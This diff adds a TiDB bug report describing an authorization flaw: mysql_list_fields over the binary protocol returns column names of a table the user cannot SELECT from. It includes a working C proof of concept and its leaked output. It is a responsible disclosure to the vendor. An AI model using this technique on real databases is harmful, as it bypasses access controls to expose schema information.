@@ -1,0 +1,88 @@
+ID: 14237
+Title: Binary Protocol leaks table info: mysql_list_fields
+Description:
+## Bug Report
+
+1. What did you do?
+
+There is a small security vulnerability, where the binary protocol is not being checked correctly. I wrote a small example program to demonstrate [using the employee sample database](https://github.com/datacharmer/test_db):
+
+```
+/*
+ example.c
+ compile with:
+ gcc example.c -o example  `mysql_config --cflags --libs`
+*/
+
+#include <mysql.h>
+#include <stdio.h>
+
+int main(int argc, char **argv) {
+
+  MYSQL *conn = mysql_init(NULL);
+  if (conn == NULL)  {
+      fprintf(stderr, "%s\n", mysql_error(conn));
+      exit(1);
+  }
+
+  /* CREATE USER newuser; GRANT SELECT ON employees.titles TO newuser; */
+  if (mysql_real_connect(conn, "127.0.0.1", "newuser", "", "employees", 4000, NULL, 0) == NULL) {
+      fprintf(stderr, "%s\n", mysql_error(conn));
+      mysql_close(conn);
+      exit(1);
+  }  
+
+  int i;
+  MYSQL_RES *tbl_cols = mysql_list_fields(conn, "salaries", NULL);
+  unsigned int field_cnt = mysql_num_fields(tbl_cols);
+  printf("Number of columns: %d\n", field_cnt);
+
+  for (i=0; i < field_cnt; ++i) {
+    /* col describes i-th column of the table */
+    MYSQL_FIELD *col = mysql_fetch_field_direct(tbl_cols, i);
+    printf ("Column %d: %s\n", i, col->name);
+  }
+  
+  mysql_free_result(tbl_cols);
+
+  mysql_close(conn);
+  exit(0);
+
+}
+```
+
+
+2. What did you expect to see?
+
+This should fail due to a permissions error. If you use the non-binary program it will:
+```
+mysql> desc salaries;
+ERROR 1142 (42000): SELECT command denied to user 'newuser'@'%' for table 'salaries'
+```
+
+3. What did you see instead?
+
+```
+$ ./example 
+Number of columns: 4
+Column 0: emp_no
+Column 1: salary
+Column 2: from_date
+Column 3: to_date
+```
+
+4. What version of TiDB are you using (`tidb-server -V` or run `select tidb_version();` on TiDB)?
+
+```
+mysql> select tidb_version()\G
+*************************** 1. row ***************************
+tidb_version(): Release Version: v4.0.0-alpha-1246-g7f8c3c808
+Git Commit Hash: 7f8c3c8083ced5a0d05684c1b55654577896a846
+Git Branch: master
+UTC Build Time: 2019-12-24 02:06:14
+GoVersion: go1.13
+Race Enabled: false
+TiKV Min Version: v3.0.0-60965b006877ca7234adaced7890d7b029ed1306
+Check Table Before Drop: false
+1 row in set (0.00 sec)
+```
